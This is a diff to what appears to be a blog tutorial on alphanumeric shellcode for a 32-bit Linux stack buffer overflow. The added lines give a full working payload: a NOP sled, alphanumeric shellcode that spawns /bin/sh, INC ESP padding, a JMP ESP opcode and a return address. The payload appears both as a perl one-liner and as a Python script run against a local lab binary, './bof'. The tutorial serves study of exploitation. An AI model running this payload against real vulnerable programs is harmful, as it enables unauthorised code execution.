@@ -320,7 +320,7 @@ so we can pass the first 6 NOP bytes + 66 shellcode bytes + 4 EIP address redire
 
 As we can see in this case we can choose an adress at the end of NOP zone before our shellcode so ```0xbffff788```. Now we can observe what happens in the stack when we use this address
 
-![](/assets/images/linux/x86/alphanumeric_0.gif)<br>
+![](/assets/images/linux/x86/alphanumeric_1.gif)<br>
 
 
 ```
@@ -338,3 +338,33 @@ As we can see in this case we can choose an adress at the end of NOP zone before
 As we can see we execute perfectly our shellcode since we have to execute it with the ```0xffff80cd``` (int 0x80) instruction. We can see also that the instruction is down 16 words in the stack. So now we can INC ESP 16 times to move the ```0xffff80cd``` address at the top of the stack. INC ESP is in our table of instrctions and has opcdoe 0x44 or "D".<br>
 Last thing, call the ```0xffff80cd``` with a JMP ESP instruction. I know it is not in the table of our approved instruction and that's the last trick: the JMP ESP opcode is ```\xff\xe4``` and we can put this opcode just before the return address and not inside the shellcode.
 
+![](/assets/images/linux/x86/alphanumeric_2.gif)<br>
+
+So lastly our command is that
+```
+./bof `perl -e 'print "\x90"x48 . "j0X40PZHf5sOf5A0PRXRj0X40hXXshXf5wwPj0X4050binHPTXRQSPTUVWaPYS4J4A" . "D"x16 . "\xff\xe4\x79\xf7\xff\xbf"'`
+```
+Putting all toghether in a python script and execute it
+
+```python
+#!/usr/bin/python
+import os
+
+print "[*] Loading NOP"
+z = "\x90"*48
+print "[*] Loading alphanumeric"
+z += "j0X40PZHf5sOf5A0PRXRj0X40hXXshXf5wwPj0X4050binHPTXRQSPTUVWaPYS4J4A"
+print "[*] Loading syscall"
+z += "D"*16
+print "[*] Loading JMP and landing address"
+z += "\xff\xe4\x79\xf7\xff\xbf"
+print "[*] Popping the shell..."
+os.system("./bof " + z)
+```
+![](/assets/images/linux/x86/alphanumeric_3.gif)<br>
+
+## References
+
+[Phrack Magazine](http://phrack.org/issues/57/15.html)
+[NetSec wiki](https://nets.ec/Ascii_shellcode#The_Kernel_Interrupt)
+[Exploit-Db docs](https://www.exploit-db.com/docs/english/13127-writing-self-modifying-code-andutilizing-advanced-assembly-techniques.pdf)
